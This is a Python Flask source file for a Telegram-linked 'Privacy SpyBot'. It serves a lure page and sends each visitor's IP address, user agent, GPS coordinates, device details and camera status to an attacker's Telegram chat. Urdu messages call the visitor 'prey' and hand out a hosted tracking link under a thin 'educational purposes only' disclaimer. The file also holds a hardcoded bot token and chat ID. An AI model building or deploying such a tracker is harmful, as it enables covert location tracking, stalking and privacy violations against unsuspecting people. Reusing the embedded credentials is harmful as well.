from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

# ✅ Telegram Configuration
BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"

@app.route('/')
def index():
    return render_template("spy.html")

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = data.get('userAgent', 'Unknown')
    lat = data.get('latitude')
    lon = data.get('longitude')
    location_url = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "❌ Location Not Available"
    device_info = data.get('deviceInfo', 'Unknown')
    camera_status = data.get('camera', '❌')

    message = f"""👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device Info: {user_agent}
📍 Location: {location_url}
📷 Camera: {camera_status}
🧠 Raw Data: {data}
    """

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    requests.post(url, data=payload)

    return "OK", 200

# ✅ Telegram /start Handler
@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def telegram_webhook():
    msg = request.get_json()
    if "message" in msg and msg["message"].get("text") == "/start":
        chat_id = msg["message"]["chat"]["id"]
        welcome = f"""🌐 خوش آمدید فیضانؔ مغل کے Privacy SpyBot میں!

🕵️ یہ بوٹ آپ کو ریئل ٹائم لوکیشن، IP، ڈیوائس انفارمیشن اور مزید خفیہ ڈیٹا حاصل کرنے میں مدد دے گا۔

🔗 اپنے شکار کا لنک یہ ہے:
👉 https://faizan-spybot.onrender.com

⚠️ خبردار: یہ بوٹ صرف تعلیمی مقاصد کے لیے ہے۔
        """
        send_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": welcome}
        requests.post(send_url, data=payload)
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
